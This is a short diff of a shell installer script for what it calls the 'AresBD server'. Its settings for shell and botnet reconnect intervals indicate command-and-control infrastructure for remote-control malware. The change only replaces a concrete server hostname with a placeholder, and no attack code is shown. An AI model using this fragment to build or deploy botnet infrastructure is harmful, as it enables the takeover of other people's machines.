@@ -8,7 +8,7 @@
 SHELL_RECONNECT=60
 BOTNET_RECONNECT=300
 PORT=2222
-SERVER=atlas.stsosz.io
+SERVER=YOUR.SERVER
 
 echo "Welcome to the AresBD server installer."
 echo "Using port $PORT"
